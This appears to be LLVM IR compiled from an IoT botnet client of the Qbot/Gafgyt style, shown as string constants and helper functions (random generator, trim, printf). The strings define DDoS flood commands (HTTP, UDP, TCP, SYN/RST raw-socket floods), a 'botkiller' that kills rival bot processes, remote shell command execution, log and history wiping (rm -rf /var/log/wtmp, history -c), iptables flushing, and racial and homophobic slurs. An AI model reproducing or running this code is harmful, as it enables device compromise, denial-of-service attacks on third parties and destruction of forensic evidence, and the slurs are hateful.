@.str.403 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.404 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.406 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.407 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"shdyed\00", align 1
@.str.409 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.410 = private unnamed_addr constant [10 x i8] c"sghwiondc\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"nigger\00", align 1
@.str.412 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"faggot\00", align 1
@.str.414 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.415 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.416 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.418 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.419 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.420 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.421 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.422 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.423 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@botkiller.teldirs = private unnamed_addr constant [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* null], align 16
@botkiller.Boats = private unnamed_addr constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0)], align 16
@botkiller.bots = private unnamed_addr constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.454, i32 0, i32 0)], align 16
@.str.455 = private unnamed_addr constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00", align 1
@.str.456 = private unnamed_addr constant [29 x i8] c">%s.t && cd %s ; >retrieve\0D\0A\00", align 1
@.str.457 = private unnamed_addr constant [14 x i8] c"pkill -9 %s\0D\0A\00", align 1
@.str.446 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.447 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.448 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.432 = private unnamed_addr constant [5 x i8] c"sex*\00", align 1
@.str.437 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.449 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.450 = private unnamed_addr constant [8 x i8] c"mipsel*\00", align 1
@.str.431 = private unnamed_addr constant [6 x i8] c"mips*\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"mips64*\00", align 1
@.str.452 = private unnamed_addr constant [6 x i8] c"i686*\00", align 1
@.str.453 = private unnamed_addr constant [7 x i8] c"sparc*\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.426 = private unnamed_addr constant [5 x i8] c"bot*\00", align 1
@.str.436 = private unnamed_addr constant [11 x i8] c"jackmeoff*\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hackz*\00", align 1
@.str.454 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.424 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.425 = private unnamed_addr constant [6 x i8] c"armv*\00", align 1
@.str.427 = private unnamed_addr constant [6 x i8] c"ntpd*\00", align 1
@.str.429 = private unnamed_addr constant [8 x i8] c"shitty*\00", align 1
@.str.430 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.433 = private unnamed_addr constant [4 x i8] c"i86\00", align 1
@.str.434 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"i56\00", align 1
@.str.439 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.440 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.441 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.442 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.443 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.444 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.458 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.459 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.460 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.461 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.462 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.463 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.464 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.465 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.466 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.467 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.468 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.469 = private unnamed_addr constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00", align 1
@.str.470 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.472 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.473 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.474 = private unnamed_addr constant [27 x i8] c"[BOTKILLER] [STARTED] [%s]\00", align 1
@.str.475 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.476 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.477 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.478 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.479 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.480 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.481 = private unnamed_addr constant [6 x i8] c"PHONE\00", align 1
@.str.482 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.483 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.484 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.485 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.486 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.487 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.488 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.489 = private unnamed_addr constant [6 x i8] c"HITTA\00", align 1
@.str.490 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.491 = private unnamed_addr constant [23 x i8] c"[CONNECTED] [%s] [%s]\0A\00", align 1
@.str.492 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.493 = private unnamed_addr constant [29 x i8] c"\1B[0;32m[CONNECTED] [%s] [%s]\00", align 1
@.str.494 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.495 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.496 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.497 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.498 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.499 = private unnamed_addr constant [19 x i8] c"BYE MISTER HITTA!\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %21, label %12

; <label>:12:                                     ; preds = %3
  %13 = load i8*, i8** %2, align 8
  %14 = load i8*, i8** %2, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = sub i64 %15, 1
  %17 = getelementptr inbounds i8, i8* %13, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  br label %21

; <label>:21:                                     ; preds = %12, %3
  %22 = phi i1 [ true, %3 ], [ %20, %12 ]
  br i1 %22, label %23, label %29

; <label>:23:                                     ; preds = %21
  %24 = load i8*, i8** %2, align 8
  %25 = load i8*, i8** %2, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = sub i64 %26, 1
  %28 = getelementptr inbounds i8, i8* %24, i64 %27
  store i8 0, i8* %28, align 1
  br label %3

; <label>:29:                                     ; preds = %21
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #5
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 %18, i32 1, i1 false)
  %19 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %4, align 8
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %39

; <label>:21:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  br label %22

; <label>:22:                                     ; preds = %35, %21
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* %2, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %22
  %27 = call i32 @rand() #5
  %28 = srem i32 %27, 26
  %29 = add nsw i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %1, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %22

; <label>:38:                                     ; preds = %22
  br label %68

; <label>:39:                                     ; preds = %0
  %40 = call i32 @rand() #5
  %41 = call i32 @rand() #5
  %42 = mul nsw i32 %40, %41
  %43 = srem i32 %42, 45402
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %53, %39
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %6, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %56

; <label>:49:                                     ; preds = %45
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %52 = call i8* @fgets(i8* %50, i32 1024, %struct._IO_FILE* %51)
  br label %53

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %3, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %3, align 4
  br label %45

; <label>:56:                                     ; preds = %45
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 1024, i32 16, i1 false)
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %59 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %60 = call i8* @fgets(i8* %58, i32 1024, %struct._IO_FILE* %59)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %61)
  %62 = load i8*, i8** %1, align 8
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %64 = load i32, i32* %2, align 4
  %65 = sext i32 %64 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %62, i8* %63, i64 %65, i32 1, i1 false)
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* %66)
  br label %68

; <label>:68:                                     ; preds = %56, %38
  %69 = load i8*, i8** %1, align 8
  ret i8* %69
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

declare i32 @fclose(%struct._IO_FILE*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
